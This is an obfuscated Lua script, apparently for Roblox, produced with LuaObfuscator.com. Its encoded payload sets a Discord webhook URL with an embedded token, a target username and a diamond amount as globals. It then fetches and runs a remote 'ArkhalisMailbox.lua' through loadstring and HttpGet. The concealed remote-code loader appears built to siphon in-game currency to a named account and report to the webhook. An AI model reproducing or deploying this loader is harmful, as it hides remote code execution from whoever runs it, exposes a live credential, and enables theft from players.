--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v80=0;local v81;while true do if (v80==0) then v81=v2(v0(v30,16));if v19 then local v100=0;local v101;while true do if (v100==1) then return v101;end if (v100==0) then v101=v5(v81,v19);v19=nil;v100=1;end end else return v81;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v82=(v31/((5 -(1 + 2))^(v32-1)))%((5 -3)^(((v33-(1 -0)) -(v32-(2 -1))) + (620 -(555 + 64)))) ;return v82-(v82%1) ;else local v83=931 -(857 + 74) ;local v84;while true do if (v83==(568 -((1244 -(282 + 595)) + 201))) then v84=2^(v32-1) ;return (((v31%(v84 + v84))>=v84) and ((2565 -(1523 + 114)) -(193 + 21 + 713))) or (0 + 0) ;end end end end local function v21()local v34=(957 -(892 + 65)) -0 ;local v35;while true do if (v34==(0 -0)) then v35=v1(v16,v18,v18);v18=v18 + 1 + 0 ;v34=1066 -(68 + 997) ;end if (v34==(1271 -(226 + 1044))) then return v35;end end end local function v22()local v36,v37=v1(v16,v18,v18 + (4 -2) );v18=v18 + 2 ;return (v37 * (472 -216)) + v36 ;end local function v23()local v38,v39,v40,v41=v1(v16,v18,v18 + ((1135 -(802 + 150)) -(67 + 113)) );v18=v18 + (7 -3) ;return (v41 * (41190819 -24413603)) + (v40 * (65886 -(87 + 263))) + (v39 * (1017 -761)) + v38 ;end local function v24()local v42=v23();local v43=v23();local v44=2 -1 ;local v45=(v20(v43,3 -2 ,36 -16 ) * ((2 + 0)^(1029 -(915 + 82)))) + v42 ;local v46=v20(v43,2 + 19 ,87 -56 );local v47=((v20(v43,470 -(145 + 293) )==(431 -(44 + 386))) and  -(1 + 0)) or (1 -(0 + 0)) ;if (v46==(1187 -(1069 + (1003 -(261 + 624))))) then if (v45==(0 -(0 -0))) then return v47 * ((1080 -(1020 + 60)) -0) ;else v46=4 -3 ;v44=0 + 0 ;end elseif (v46==(3636 -1589)) then return ((v45==(0 + 0)) and (v47 * (((2215 -(630 + 793)) -(368 + 423))/(0 -0)))) or (v47 * NaN) ;end return v8(v47,v46-(3466 -2443) ) * (v44 + (v45/((20 -(10 + 8))^(127 -75)))) ;end local function v25(v48)local v49=0 -0 ;local v50;local v51;while true do if (v49==(2 + 1)) then return v6(v51);end if (v49==(3 -2)) then v50=v3(v16,v18,(v18 + v48) -(1748 -(760 + 987)) );v18=v18 + v48 ;v49=1915 -(1789 + 124) ;end if (v49==((3380 -2612) -(745 + 21))) then v51={};for v92=1 + 0 , #v50 do v51[v92]=v2(v1(v3(v50,v92,v92)));end v49=3;end if (v49==(0 -0)) then v50=nil;if  not v48 then local v99=0 -0 ;while true do if (v99==(0 + 0)) then v48=v23();if (v48==(0 + 0 + 0)) then return "";end break;end end end v49=1056 -((196 -109) + 968) ;end end end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v52=0 -0 ;local v53;local v54;local v55;local v56;local v57;local v58;local v59;while true do if (v52~=(2 -1)) then else local v88=0;while true do if (v88==(0 + 0)) then v55=nil;v56=nil;v88=1;end if (v88==1) then v52=3 -1 ;break;end end end if (2==v52) then local v89=1467 -(899 + 568) ;local v90;while true do if (v89~=(0 + 0)) then else v90=0;while true do if (v90==(2 -1)) then v52=606 -(268 + 335) ;break;end if (v90==0) then local v111=290 -(60 + 230) ;while true do if (v111==0) then v57=nil;v58=nil;v111=1;end if (v111==1) then v90=1;break;end end end end break;end end end if (v52==0) then local v91=572 -(426 + 146) ;while true do if (v91==1) then v52=1 + 0 ;break;end if (v91~=(1456 -(282 + 1174))) then else v53=0;v54=nil;v91=1;end end end if ((814 -(569 + 242))~=v52) then else v59=nil;while true do local v94=0;while true do if (v94==(0 -0)) then local v102=0 + 0 ;while true do if (v102~=0) then else if (v53==(1025 -(706 + 318))) then local v141=0;local v142;local v143;while true do if (v141~=(1252 -(721 + 530))) then else while true do if (v142==(1271 -(945 + 326))) then v143=0;while true do if (v143~=1) then else v59={};v53=4 -2 ;break;end if (v143==(0 + 0)) then local v192=700 -(271 + 429) ;local v193;while true do if (v192~=0) then else v193=0 + 0 ;while true do if (v193~=(1501 -(1408 + 92))) then else v143=1;break;end if (v193~=(1086 -(461 + 625))) then else v57={v54,v55,nil,v56};v58=v23();v193=1;end end break;end end end end break;end end break;end if (v141==(1171 -(418 + 753))) then v142=0 + 0 ;v143=nil;v141=1 + 0 ;end end end if (v53~=2) then else local v144=0;local v145;while true do if (0==v144) then v145=0;while true do if (v145==1) then for v180=1 + 0 ,v23() do local v181=0;local v182;local v183;local v184;while true do if (v181==0) then v182=0 + 0 ;v183=nil;v181=530 -(406 + 123) ;end if ((1770 -(1749 + 20))==v181) then v184=nil;while true do if (v182~=(1 + 0)) then else while true do if (v183==0) then v184=v21();if (v20(v184,1323 -(1249 + 73) ,1)~=(0 + 0)) then else local v197=0;local v198;local v199;local v200;while true do if (v197~=0) then else local v201=0;while true do if (v201==0) then v198=v20(v184,1147 -(466 + 679) ,3);v199=v20(v184,9 -5 ,17 -11 );v201=1901 -(106 + 1794) ;end if (1~=v201) then else v197=1 + 0 ;break;end end end if (v197==1) then local v202=0;while true do if (v202==(0 + 0)) then local v207=0 -0 ;while true do if (v207~=0) then else v200={v22(),v22(),nil,nil};if (v198==(584 -(57 + 527))) then local v212=0;local v213;local v214;while true do if (v212==1) then while true do if (v213==(1427 -(41 + 1386))) then v214=103 -(17 + 86) ;while true do if (0==v214) then v200[3 + 0 ]=v22();v200[8 -4 ]=v22();break;end end break;end end break;end if ((0 -0)==v212) then v213=166 -(122 + 44) ;v214=nil;v212=1;end end elseif (v198==1) then v200[3]=v23();elseif (v198==2) then v200[3]=v23() -((2 -0)^16) ;elseif (v198==3) then local v217=0 -0 ;local v218;while true do if (v217==0) then v218=0 + 0 ;while true do if (0~=v218) then else v200[3]=v23() -(2^16) ;v200[1 + 3 ]=v22();break;end end break;end end end v207=1 -0 ;end if (v207~=(66 -(30 + 35))) then else v202=1;break;end end end if (v202==1) then v197=2;break;end end end if (v197==(3 + 0)) then if (v20(v199,3,3)==(1258 -(1043 + 214))) then v200[15 -11 ]=v59[v200[1216 -(323 + 889) ]];end v54[v180]=v200;break;end if (v197~=(5 -3)) then else local v204=580 -(361 + 219) ;while true do if (1==v204) then v197=3;break;end if ((320 -(53 + 267))==v204) then if (v20(v199,1,1 + 0 )==(414 -(15 + 398))) then v200[984 -(18 + 964) ]=v59[v200[2]];end if (v20(v199,7 -5 ,2 + 0 )~=(1 + 0)) then else v200[853 -(20 + 830) ]=v59[v200[3]];end v204=1 + 0 ;end end end end end break;end end break;end if (v182==(126 -(116 + 10))) then v183=0;v184=nil;v182=1 + 0 ;end end break;end end end v53=3;break;end if (v145~=(738 -(542 + 196))) then else for v185=1,v58 do local v186=0;local v187;local v188;local v189;while true do if (v186~=(0 -0)) then else v187=0 + 0 ;v188=nil;v186=1 + 0 ;end if (v186==(1 + 0)) then v189=nil;while true do if (v187==0) then local v194=0 -0 ;while true do if ((0 -0)~=v194) then else local v196=0;while true do if (v196==1) then v194=1;break;end if (v196==0) then v188=v21();v189=nil;v196=1552 -(1126 + 425) ;end end end if (v194~=(406 -(118 + 287))) then else v187=3 -2 ;break;end end end if (v187~=(1122 -(118 + 1003))) then else if (v188==1) then v189=v21()~=(0 -0) ;elseif (v188==(379 -(142 + 235))) then v189=v24();elseif (v188~=3) then else v189=v25();end v59[v185]=v189;break;end end break;end end end v57[13 -10 ]=v21();v145=1;end end break;end end end v102=1;end if (v102~=1) then else v94=1;break;end end end if (v94~=(1 + 0)) then else if (0~=v53) then else local v112=0;local v113;local v114;while true do if (v112~=0) then else v113=977 -(553 + 424) ;v114=nil;v112=1 -0 ;end if (v112~=1) then else while true do if ((0 + 0)==v113) then v114=0;while true do if (v114==(1 + 0)) then v56={};v53=1 + 0 ;break;end if (v114==(0 + 0)) then local v178=0;local v179;while true do if ((0 + 0)==v178) then v179=0;while true do if (v179~=1) then else v114=2 -1 ;break;end if (v179~=(0 -0)) then else v54={};v55={};v179=2 -1 ;end end break;end end end end break;end end break;end end end if (v53~=(1 + 2)) then else local v115=0 -0 ;while true do if (v115==0) then local v146=0;while true do if ((753 -(239 + 514))==v146) then local v174=0 + 0 ;while true do if (v174==(1329 -(797 + 532))) then for v190=1,v23() do v55[v190-(1 + 0) ]=v28();end return v57;end end end end end end end break;end end end break;end end end local function v29(v60,v61,v62)local v63=v60[1];local v64=v60[2];local v65=v60[3];return function(...)local v66=v63;local v67=v64;local v68=v65;local v69=v27;local v70=1;local v71= -1;local v72={};local v73={...};local v74=v12("#",...) -1 ;local v75={};local v76={};for v85=0,v74 do if (v85>=v68) then v72[v85-v68 ]=v73[v85 + 1 ];else v76[v85]=v73[v85 + 1 ];end end local v77=(v74-v68) + 1 ;local v78;local v79;while true do v78=v66[v70];v79=v78[1];if (v79<=5) then if (v79<=2) then if (v79<=0) then v76[v78[2]][v78[3]]=v78[4];v70=v70 + 1 ;v78=v66[v70];v76[v78[2]]=v62[v78[3]];v70=v70 + 1 ;v78=v66[v70];v76[v78[2]][v78[3]]=v78[4];v70=v70 + 1 ;v78=v66[v70];v76[v78[2]]=v78[3];v70=v70 + 1 ;v78=v66[v70];v70=v78[3];elseif (v79>1) then v76[v78[2]]();else v76[v78[2]][v78[3]]=v78[4];end elseif (v79<=3) then do return;end elseif (v79>4) then v76[v78[2]]=v78[3];else local v120=0;local v121;local v122;local v123;local v124;local v125;while true do if (v120==0) then v121=nil;v122,v123=nil;v124=nil;v125=nil;v76[v78[2]][v78[3]]=v78[4];v70=v70 + 1 ;v120=1;end if (v120==6) then v70=v78[3];break;end if (v120==4) then v71=(v123 + v125) -1 ;v121=0;for v169=v125,v71 do v121=v121 + 1 ;v76[v169]=v122[v121];end v70=v70 + 1 ;v78=v66[v70];v125=v78[2];v120=5;end if (v120==5) then v76[v125]=v76[v125](v13(v76,v125 + 1 ,v71));v70=v70 + 1 ;v78=v66[v70];v76[v78[2]]();v70=v70 + 1 ;v78=v66[v70];v120=6;end if (v120==1) then v78=v66[v70];v76[v78[2]]=v62[v78[3]];v70=v70 + 1 ;v78=v66[v70];v76[v78[2]]=v62[v78[3]];v70=v70 + 1 ;v120=2;end if (v120==3) then v78=v66[v70];v76[v78[2]]=v78[3];v70=v70 + 1 ;v78=v66[v70];v125=v78[2];v122,v123=v69(v76[v125](v13(v76,v125 + 1 ,v78[3])));v120=4;end if (v120==2) then v78=v66[v70];v125=v78[2];v124=v76[v78[3]];v76[v125 + 1 ]=v124;v76[v125]=v124[v78[4]];v70=v70 + 1 ;v120=3;end end end elseif (v79<=8) then if (v79<=6) then v76[v78[2]]=v62[v78[3]];elseif (v79>7) then local v126=0;local v127;local v128;local v129;local v130;while true do if (v126==0) then v127=v78[2];v128,v129=v69(v76[v127](v13(v76,v127 + 1 ,v78[3])));v126=1;end if (v126==2) then for v172=v127,v71 do local v173=0;while true do if (v173==0) then v130=v130 + 1 ;v76[v172]=v128[v130];break;end end end break;end if (1==v126) then v71=(v129 + v127) -1 ;v130=0;v126=2;end end else local v131=v78[2];local v132=v76[v78[3]];v76[v131 + 1 ]=v132;v76[v131]=v132[v78[4]];end elseif (v79<=10) then if (v79>9) then if (v76[v78[2]]==v78[4]) then v70=v70 + 1 ;else v70=v78[3];end else local v136=v78[2];v76[v136]=v76[v136](v13(v76,v136 + 1 ,v71));end elseif (v79==11) then for v139=v78[2],v78[3] do v76[v139]=nil;end else v70=v78[3];end v70=v70 + 1 ;end end;end return v29(v28(),{},v17)(...);end v15("LOL!0D3O00028O00026O00F03F03023O005F4703073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O313039362O3332312O3338343633303332362F76712D4677322D43554B2D36454F6B2D55416F436A416E7837664B357A79576E4C314F676A3952464872796A4D334F5630424A46695A4A696B56724A5F365F786A694245030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403313O00682O7470733A2O2F61726B68616C69736C75612E6769746875622E696F2F41726B68616C69734D61696C626F782E6C756103083O00557365726E616D65030D3O004730542O48502O4550414C2O5403083O004469616D6F6E6473024O002O841E41001C3O0012053O00014O000B000100013O00260A3O00020001000100040C3O00020001001205000100013O00260A000100110001000200040C3O00110001001206000200033O00300400020004000500122O000200063O00122O000300073O00202O00030003000800122O000500096O000300056O00023O00024O00020001000100044O001B000100260A000100050001000100040C3O00050001001206000200033O00302O0002000A000B00122O000200033O00302O0002000C000D00122O000100023O00044O0005000100040C3O001B000100040C3O000200012O00033O00017O00",v9(),...);end